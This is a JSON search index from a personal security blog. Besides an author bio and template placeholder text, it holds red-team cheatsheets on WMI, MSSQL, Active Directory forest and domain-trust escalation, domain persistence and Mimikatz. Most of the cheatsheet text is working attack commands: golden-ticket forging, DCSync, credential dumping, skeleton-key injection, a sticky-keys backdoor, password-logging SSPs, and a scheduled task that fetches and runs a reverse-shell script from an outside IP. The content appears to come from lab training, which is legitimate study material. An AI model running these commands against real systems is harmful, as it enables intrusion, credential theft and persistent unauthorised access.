[{"authors":null,"categories":null,"content":"Giovanni Pecoraro is a Senior Security Engineer at RHEA Group. His research interests include space systems, cyber security, signal processing and artificial intelligence.\n","date":1664409600,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1664409600,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"","publishdate":"0001-01-01T00:00:00Z","relpermalink":"","section":"authors","summary":"Giovanni Pecoraro is a Senior Security Engineer at RHEA Group. His research interests include space systems, cyber security, signal processing and artificial intelligence.","tags":null,"title":"Giovanni Pecoraro","type":"authors"},{"authors":["Lazzaro di Biase","Pasquale Maria Pecoraro","Giovanni Pecoraro","Maria Letizia Caminiti","Vincenzo Di Lazzaro"],"categories":null,"content":" Click the Cite button above to demo the feature to enable visitors to import publication metadata into their reference management software. Create your slides in Markdown - click the Slides button to check out the example. Supplementary notes can be added here, including code, math, and images.\n","date":166752e4,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":166752e4,"objectID":"966884cc0d8ac9e31fab966c4534e973","permalink":"https://www.peco602.com/publication/journal-article/","publishdate":"2022-11-04T00:00:00Z","relpermalink":"/publication/journal-article/","section":"publication","summary":"Different technologies have been proposed for indoor monitoring over the past decades, with different degrees of invasiveness, complexity, and capabilities in full-body monitoring. In recent years, among all available technologies, there has been an increasing interest in using RF-based technology because it can provide a more accurate and reliable method of tracking patients' movements compared to other methods, such as camera-based systems or wearable sensors.","tags":["Source Themes"],"title":"Markerless radio frequency indoor monitoring for telemedicine: gait analysis, indoor positioning, fall detection, tremor analysis, vital signs and sleep monitoring","type":"publication"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Windows Management Instrumentation (WMI) is Microsoft’s implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM). WMI provides a unique interface for applications/scripts to manage a local or remote network or computer.\nWMI can be used for Red Teaming because:\nit is enabled on all Windows systems by default; it really mixes well with existing network traffic; it provides execution and persistence with SYSTEM privileges; it is often neglected by defenders. By default, the WMI service – Winmgmt is running and listening on port 135. DCOM connections are established on port 135, while subsequent data exchanged on port dictated by HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Internet – Ports (REG_MULTI_SZ) configurable via DCOMCNFG.exe.\nWMI Basics WMI Components Component Description Managed Objects Component being managed by WMI (e.g. process, service, operating system). Managed Objects Format (MOF) files Used to define WMI namespaces, classes, providers, etc. Classes Represent items in WMI (e.g. process, hardware, service) Repository The database used to store the static data (definitions) of classes. Namespaces Created by providers, they are used to divide classes logically (e.g. root\\cimv2, root\\default, root\\security). Providers Just like a driver, works as a bridge between a managed object and WMI. They generally exist for every MOF file. Consumers Applications or scripts which can be used to interact with WMI classes (e.g. powershell, wmic). Exploring commands WMI Commands - PowerShell v2 Get-Command -CommandType Cmdlet *wmi* | select name Get-WmiObject Invoke-WmiMethod Register-WmiEvent Remove-WmiObject Set-WmiInstance CIM Commands - PowerShell v3 CIM commands use WS-MAN so they can be used also against boxes where WMI is blocked but WS-MAN (WinRM) is enabled (even if the target has PowerShell version 2). They can be used also against non-Windows boxes.\nGet-Command -CommandType Cmdlet *cim* | select name Get-CimAssociatedInstance Get-CimClass Get-CimInstance Get-CimSession Invoke-CimMethod New-CimInstance New-CimSession New-CimSessionOption Register-CimIndicationEvent Remove-CimInstance Remove-CimSession Set-CimInstance WMI and CIM commands relations WMI CIM Get-WmiObject Get-CmiInstance Get-WmiObject -List Get-CmiClass Invoke-WmiMethod Invoke-CimMethod Register-WmiEvent Register-CimIndicationEvent Remove-WmiObject Remove-CimInstance Set-WmiInstance Set-CimInstance Exploring namespaces within root namespace Get-WmiObject -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; Get-WmiObject -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; | select name Get-CimInstance -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; | select name # Recursively list nested namespaces Get-WmiNamespace.ps1 Exploring classes and objects Once we have a namespace, we can explore its classes. Classes represent items in WMI like process, hardware, service, etc.\nGet classes If not specified, root/cim2 is the default namespace. Use -List parameter for Get-WmiObject.\nGet-WmiObject -Namespace root\\cimv2 -Class *bios* -List Get-WmiObject -Class *bios* -List Get-CimClass -Namespace root\\cimv2 -Class *bios* Get-CimClass -Class *bios* Get-CimClass -QualifierName dynamic Get instances of a class (objects) Get-WmiObject -Class Win32_BIOS Get-CimInstance -ClassName Win32_BIOS Filtering objects Get-WmiObject -Class Win32_Process -Filter \u0026#34;Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; Get-CimInstance -ClassName Win32_Process -Filter \u0026#34;Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; | fl * Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq \u0026#34;explorer.exe\u0026#34;} Get-CimInstance -ClassName Win32_Process | Where-Object {$_.Name -eq \u0026#34;explorer.exe\u0026#34;} Get-WmiObject -Query \u0026#34;select * from Win32_Process where Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; Get-CimInstance -Query \u0026#34;select * from Win32_Process where Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; Example of WMI usage Get computer name, domain and local groups:\n# Explore namespaces to find the correct one Get-WmiObject -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; | select name Get-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; # Computer name and domain Get-CimInstance -Namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_ComputerSystem | Format-List -Property * # Local groups Get-CimInstance -Namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Group | Format-List -Property * List installed software:\nGet-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Product | Format-List -Property * Get installed antivirus:\nGet-CimClass -Namespace \u0026#34;root/SecurityCenter2\u0026#34; Get-CimInstance -namespace \u0026#34;root/SecurityCenter2\u0026#34; -ClassName AntiVirusProduct | Format-List -Property * List files and folders:\nGet-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; # Files Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName CIM_DataFile | Format-List -Property * # Shared folders Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Share | Format-List -Property * # Local folders Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Directory | Format-List -Property * Get security logs:\nGet-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; …","date":1664409600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1664409600,"objectID":"6af0c0dd63c31a907c3d47c60abaf752","permalink":"https://www.peco602.com/post/0080-wmi-cheatsheet/","publishdate":"2022-09-29T00:00:00Z","relpermalink":"/post/0080-wmi-cheatsheet/","section":"post","summary":"Welcome 👋 We know that first impressions are important, so we've populated your new site with some initial content to help you get familiar with everything in no time.","tags":["Red Team","Windows","Active Directory","WMI"],"title":"Windows Management Instrumentation (WMI) Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"What is SQL Server?\nA database platform A Windows application A set of Windows Services Important Notes\nOS command are usually executed as the service account The service account is a sysadmin by default Clustered servers are required to have the same service account How do I authenticate?\nAccount Types:\nWindows Account: Used to login Mapped to SQL Server login SQL Server Login Used to login Mapped to database account Database User Used to access databases Important Roles\nServer Roles: Sysadmin = Database Administrator Public Role = Everyone with CONNECT Database Roles: Database Owner = SQL login that owns the database ☺ DB_OWNER role = Allows members to take most actions in the database A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.\nPowerUpSQL Setup All possible setup options: # Download to Disk + Import Module # Download from https://github.com/NetSPI/PowerUpSQL Import-Module PowerUpSQL.psd1 # Download/Import to Memory: Download Cradle 1 IEX(New-Object System.Net.WebClient).DownloadString(\u0026#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1\u0026#34;) # Download/Import to Memory: Common Download Cradle 2 \u0026amp;([scriptblock]::Create((new-object net.webclient).downloadstring(\u0026#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1\u0026#34;))) # Install Module from PowerShell Gallery Install-Module -Name PowerUpSQL List all PowerUpSQL available functions: Get-Command –Module PowerUpSQL Get-Help [FUNCTION_NAME] -Full Discovery .NET Classes - Remote Discovery [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources() Local Discovery # PowerUpSQL # OS Authentication Level: Local User # Technique: Locate services and registry keys Get-SQLInstanceLocal Remote Discovery List SQL Servers using UDP port scan:\n# PowerUpSQL # OS Authentication Level: Unauthenticated # Technique: UDP port scan Get-SQLInstanceScanUDP -Verbose -ComputerName \u0026#34;COMPUTER1\u0026#34; Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName \u0026#34;COMPUTER1\u0026#34; # Get the instance list from a file Get-SQLInstanceFile -FilePath c:\\temp\\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose List SQL Servers using UDP broadcast ping:\n# PowerUpSQL # OS Authentication Level: Unauthenticated # Technique: UDP broadcast ping Get-SQLInstanceBroadcast -Verbose List SQL Servers using TCP port scan (MSSQL exposes port 1433):\n# Nishang # OS Authentication Level: Unauthenticated # Technique: TCP port scan Invoke-PortScan -StartAddress [START_IP_ADDRESS] -EndAddress [END_IP_ADDRESS] -ScanPort -Port 1433 -Verbose # PowerSploit # OS Authentication Level: Unauthenticated # Technique: TCP port scan Invoke-PortScan -Hosts \u0026#34;COMPUTER1\u0026#34; -Ports 1433 -Verbose $result = Invoke-PortScan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -Verbose $result | | % { echo $_.hostname $_.openPorts} List Active Directory Domain SQL Server Instances:\nUsing current domain credentials:\n# PowerUpSQL # OS Authentication Level: Domain User # Technique: Query ADS via LDAP for SPNs Get-SQLInstanceDomain # List SQL Server instances running as a specific domain account Get-SQLInstanceDomain -DomainAccount \u0026#34;SQLSvc\u0026#34; # List shared domain user SQL Server service accounts (not machine account \u0026#34;*$\u0026#34;): Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($_.name -notlike \u0026#34;*$\u0026#34;) -and ($_.count -gt 1) } Using alternative domain credentials:\nrunas /noprofile /netonly /user:\u0026#34;CYBERCORP\\STUDENT1\u0026#34; PowerShell.exe Import-Module PowerUpSQL.psd1 Get-SQLInstanceDomain -Verbose -DomainController \u0026#34;CYBERCORP-DC.CYBERCORP.LOCAL\u0026#34; -Username \u0026#34;CYBERCORP\\STUDENTI1\u0026#34; -password \u0026#34;PASSWORD\u0026#34; Initial Access How do I get access?\nCommon Methods:\nAttempt to login with local or domain user privileges (Very Common) Computer accounts work too ☺ Weak SQL Server login passwords Default SQL Server login passwords Default SQL Server login passwords associated with 3rd party applications Why can domain users log to SQL Server?\nDomain users added to role (Week devops) Local users added to role Privilege inheritance (Mostly express versions) Check SQL Server accessibility Unauthenticated user # PowerUpSQL # OS Authentication Level: Unauthenticated Get-SQLInstanceUDPScan | Get-SQLConnectionTestThreaded -Verbose -Threads 15 -Username \u0026#34;testuser\u0026#34; -Password \u0026#34;testpass\u0026#34; Local user # PowerUpSQL # OS Authentication Level: Local User Get-SQLInstanceLocal | Get-SQLConnectionTestThreaded -Verbose Domain user # PowerUpSQL # OS Authentication Level: Domain User Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose # Get a list of domain SQL servers that can be logged into with a provided SQL Server login Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username \u0026#34;testuser\u0026#34; -password \u0026#34;testpass\u0026#34; Alternative …","date":1663804800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1663804800,"objectID":"a70b1a7e1f744b422c9d435d4efa5a68","permalink":"https://www.peco602.com/post/0070-mssql-cheatsheet/","publishdate":"2022-09-22T00:00:00Z","relpermalink":"/post/0070-mssql-cheatsheet/","section":"post","summary":"Welcome 👋 We know that first impressions are important, so we've populated your new site with some initial content to help you get familiar with everything in no time.","tags":["Red Team","Windows","Active Directory","MSSQL"],"title":"Microsoft SQL Server (MSSQL) Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Using Trust Tickets Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for foreign group memberships between forests.\nOnce again, we require the trust key for the inter-forest trust:\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::trust /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; # or Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; An inter-forest TGT can be forged:\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:evilcorp.local /ticket:C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.\n# asktgs.exe .\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi CIFS/evilcorp-dc.evilcorp.local Use the TGS to access the targeted service.\n# kirbikator.exe .\\kirbikator.exe lsa .\\CIFS.evilcorp-dc.evilcorp.local.kirbi Now you can access the trusted forest shares:\nls \\\\evilcorp-dc.evilcorp.local\\forestshare Alternatively, it is possible to use Kekeo to ask for the TGS:\n.\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi /service:CIFS/evilcorp-dc.evilcorp.local /dc:evilcorp-dc.evilcorp.local /ptt Search for Foreign Security Prinicpals To search for Foreign Security Principals (users who have joined groups in the trusted domain but are part of the first domain) we can use the below PowerView command:\n# PowerView Find-ForeignUser -Domain \u0026#34;evilcorp.local\u0026#34; -Verbose Find-ForeignGroup -Domain \u0026#34;evilcorp.local\u0026#34; -Verbose We get an ObjectSID that we have to search in our current domain to see if it exists:\n# PowerView Get-NetUser | ?{$_.objectsid -eq \u0026#34;S-1-5-21-738119705-704267045-3387619857-1275\u0026#34;} The ObjectSID corresponds to STUDENT2. Let’s impersonate STUDENT2 who is a user of the domain cybercorp.local:\n# Invoke-Mimikats Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /user:STUDENT2 /domain:cybercorp.local /ntlm:6b164d3b190489426e9bcb4a01df5b53 /run:powershell.exe\u0026#34;\u0026#39; Then we can access the other forest:\nls \\\\evil-dc.evilcorp.local\\c$ Search for interesting ACLs Search for interesting ACLs in the evilcorp.local forest filtering the results belonging to users in our current domain:\nInvoke-ACLScanner -Domain evilcorp.local | ?{$_.IdentitySID -match \u0026#34;S-1-5-21-738119705-704267045-3387619857\u0026#34;} The user STUDENT1 in our cyberlab.cybercorp.local has GenericAll rights on STUDENT3 in evilcorp.local. This means, interesting stuff, like password reset can be done on STUDENT3 (using Powerview dev):\n# PowerView_dev Set-DomainUserPassword -Identity STUDENT3 -AccountPassword (ConvertTo-SecureString \u0026#34;Password@123\u0026#34; –AsPlainText -Force) -Domain evilcorp.local -Verbose ","date":16632e5,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":16632e5,"objectID":"5b721aad0dc7c548a59ea23ea11d39cb","permalink":"https://www.peco602.com/post/0060-across-forests-cheatsheet/","publishdate":"2022-09-15T00:00:00Z","relpermalink":"/post/0060-across-forests-cheatsheet/","section":"post","summary":"Welcome 👋 We know that first impressions are important, so we've populated your new site with some initial content to help you get familiar with everything in no time.","tags":["Red Team","Windows","Active Directory","Forests"],"title":"Across Forests Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest:\nKrbtgt hash Trust Tickets Child to Parent using Trust Tickets Look for [In] trust key from child to parent: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::trust /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:cyberlab\\cybercorp$\u0026#34;\u0026#39; An inter-realm TGT can be forged: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;Kerberos::golden /user:[USER] /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /rc4:[TRUST_KEY_NTLM] /service:krbtgt /target:[PARENT_DOMAIN_FQDN] /ticket:[TICKET_EXPORT_PATH]\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:cybercorp.local /ticket:C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi\u0026#34;\u0026#39; Parameter Optional Description /user No Username to impersonate /domain No Domain FQDN /sid No SID of the current domain /sids No SID of the enterprise admins group of the parent domain /rc4 No NTLM (RC4) hash of the trust key account. Use /aes128 and /aes256 for using AES keys /target No Target server FQDN /service No Target service in the parent domain (krbtgt) /id Yes User RID (default 500) /groups Yes Group RID (default 513 512 520 518 519) /startoffset Yes When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future /endin Yes Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes /renewmax Yes Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 /ptt Injects the ticket into the current PowerShell process (no need to save the ticket on disk) /ticket Saves the ticket to a file for later use Get a TGS for a service (e.g. CIFS) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well: # asktgs.exe .\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi CIFS/cybercorp-dc.cybercorp.local Use the TGS to access the targeted service (may need to use it twice). # kirbikator.exe .\\kirbikator.exe lsa .\\CIFS.cybercorp-dc.cybercorp.local.kirbi Access the file share on the parent domain DC: ls \\\\cybercorp-dc.cybercorp.local\\c$ Alternatively, it is possible to use Kekeo to ask for the TGS:\n.\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi /service:CIFS/cybercorp-dc.cybercorp.local /dc:cybercorp-dc.cybercorp.local /ptt Child to Parent using krbtgt hash Look for krbtgt hash: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; Generate a Golden Ticket forcing the SID History parameter. We will abuse SID history once again. The mimkatz option “/sids” is forcefully setting the SID History for the Enterprise Admin group for cyberlab.cybercorp.local that is the Forest Enterprise Admin Group: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /krbtgt:[KRBTGT_NTLM_HASH] /ticket:[TICKET_EXPORT_PATH]\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\\AD\\Tools\\krbtgt_tkt.kirbi\u0026#34;\u0026#39; Pass the ticket to the current session on any machine of the current domain: Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\AD\\Tools\\krbtgt_tkt.kirbi\u0026#34;\u0026#39; Now, it is possible to access to machine services in the forest root domain: ls \\\\cybercorp-dc.cybercorp.local\\c$ gwmi -class win32_operatingsystem -ComputerName cybercorp-dc.cybercorp.local In order to avoid suspicious logs, impersonate Domain Controller account add to the SID History the SIDs of parent Domain Controllers group and Enterprise Domain Controllers group and set the group to 516 (Enterprise Admins group).\nGroup SID Domain Controllers S-1-5-21-[DOMAIN_ID]-516 Enterprise Domain Controllers S-1-5-9 # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:[DC_NAME]$ /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /groups:516 /sids:[PARENT_DOMAIN_CONTROLLERS_GROUP_SID],[ENTERPRISE_DOMAIN_CONTROLLERS_GROUP_SID] /krbtgt:[KRBTGT_HASH] /ptt\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:dc$ /domain:cyberlab.cybercorp.local /sid:S-1-5-211874506631-3219952063-538504511 /groups:516 /sids:S-1-521-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 …","date":1662595200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1662595200,"objectID":"3a8d18685d8770ee6a4f3342af573ce6","permalink":"https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/","publishdate":"2022-09-08T00:00:00Z","relpermalink":"/post/0050-across-domain-trusts-cheatsheet/","section":"post","summary":"Welcome 👋 We know that first impressions are important, so we've populated your new site with some initial content to help you get familiar with everything in no time.","tags":["Red Team","Windows","Active Directory","Trusts"],"title":"Across Domain Trusts Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"The following techiniques require Domain Administrator privileges on the target domain.\nDCSync .\\mimikatz.exe mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt . .\\Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command “lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt” Adding domain admin user net user jeff.ridges FooBar123! /add /domain net group \u0026#34;Administrators\u0026#34; jeff.ridges /add /domain net group \u0026#34;Domain Admins\u0026#34; jeff.ridges /add /domain net group \u0026#34;Enterprise Admins\u0026#34; jeff.ridges /add /domain Enabling plaintext credentials caching on DCs reg add \u0026#34;\\\\cyberlab-dc.cyberlab.cybercorp.local\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\u0026#34; /v UseLogonCredential /t REG_DWORD /d 1 /f reg add \u0026#34;\\\\cyberlab-dc.cyberlab.cybercorp.local\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\u0026#34; /v DisableDomainCreds /t REG_DWORD /d 0 /f Installing a sticky keys backdoor on DCs reg add \u0026#34;\\\\cyberlab-dc.cyberlab.cybercorp.local\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; /f\u0026#34;); Scheduled Task Schedule and execute a task (needs a Silver Ticket for the HOST service)\nschtasks /create /S \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; /SC Minute /RU \u0026#34;NT Authority\\SYSTEM\u0026#34; /TN \u0026#34;TASK_NAME\u0026#34; /TR \u0026#34;powershell.exe -ep bypass -c \u0026#39;iex (New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1\u0026#39;\u0026#39;\u0026#39;)\u0026#39;\u0026#34; schtasks /run /S \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; /TN \u0026#34;TASK_NAME\u0026#34; schtasks /delete /S \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; /TN \u0026#34;TASK_NAME\u0026#34; Skeleton Key Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice (DA privileges required)\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;misc::skeleton\u0026#34;\u0026#39; -ComputerName \u0026#34;COMPUTER1\u0026#34; :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # misc::skeleton Now, it is possible to access any machine with a valid username and password as mimikatz:\nEnter-PSSession -ComputerName \u0026#34;COMPUTER1\u0026#34; -Credential \u0026#34;cyberlab.cybercorp.local\\Administrator\u0026#34; In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:\n:: mimikatz.exe mimikatz # privilege::debug mimikatz # !+ mimikatz # !processprotect /process:lsass.exe /remove mimikatz # misc::skeleton mimikatz # ! DSRM There is a local administrator on every DC called Administrator whose password is the DSRM password. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.\nDump DSRM password (requires Domain Admin privileges):\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; Enable logon through hash for DSRM:\nNew-ItemProperty \u0026#34;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u0026#34; -Name \u0026#34;DsrmAdminLogonBehavior\u0026#34; -Value 2 -PropertyType DWORD Since it is the local administrator of the DC, we can pass-the-hash to authenticate. Use below command to pass the hash (/domain: parameter needs machine and not domain name)\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:[DC_FQDN] /user:Administrator /ntlm:[DSRM_NTLM_HASH] /run:powershell.exe\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:cyberlab-dc.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\u0026#34;\u0026#39; Now, it is possible to navigate through domain controller file system:\nls \\\\cyberlab-dc.cyberlab.cybercorp.local\\C$ Custom SSP Add mililib.dll library to log every account access. Drop the mimilib.dll to system32 and add mimilib to HKLMPackages:\npackages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name \u0026#39;Security Packages\u0026#39; | select -ExpandProperty \u0026#39;Security Packages\u0026#39; $packages += \u0026#34;mimilib\u0026#34; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name \u0026#39;Security Packages\u0026#39; -Value $packages Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name \u0026#39;Security Packages\u0026#39; -Value $packages Using mimikatz, inject into lsass (Not stable with Server 2016):\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;misc::memssp\u0026#34;\u0026#39; Once the SSP is registered, all users who log on to the DC, and all local services will log their passwords to the c:\\Windows\\System32\\mimilsa.log file.\nACL Right Abuse With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.\nCheck if the user has replication rights on the domain:\n# PowerView Get-ObjectAcl -DistinguishedName \u0026#34;dc=cyberlab,dc=cybercorp,dc=local\u0026#34; -ResolveGUIDs | ?{($_.IdentityReference -match \u0026#34;STUDENT1\u0026#34;) -and (($_.ObjectType -match \u0026#39;replication\u0026#39;) -or ($_.ActiveDirectoryRights -match \u0026#39;GenericAll\u0026#39;))} Add FullControl rights to the domain object:\n# PowerView Add-ObjectAcl -TargetDistinguishedName \u0026#34;DC=cyberlab,DC=cybercorp,DC=local\u0026#34; -PrincipalSamAccountName \u0026#34;STUDENT1\u0026#34; -Rights All -Verbose # …","date":1661990400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1661990400,"objectID":"e7fa60aa0f16a9bb0c62ecf1be0a0412","permalink":"https://www.peco602.com/post/0040-domain-persistence-cheatsheet/","publishdate":"2022-09-01T00:00:00Z","relpermalink":"/post/0040-domain-persistence-cheatsheet/","section":"post","summary":"Welcome 👋 We know that first impressions are important, so we've populated your new site with some initial content to help you get familiar with everything in no time.","tags":["Red Team","Windows","Active Directory","Persistence"],"title":"Domain Persistence Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Basic commands Dump credentials on a local machine (needs local administrator rights):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -DumpCreds Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34;\u0026#39;\t# Cached passwords Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39;\t# SAM database passwords Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::secrets\u0026#34;\u0026#39;\t# LSA secrets Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; 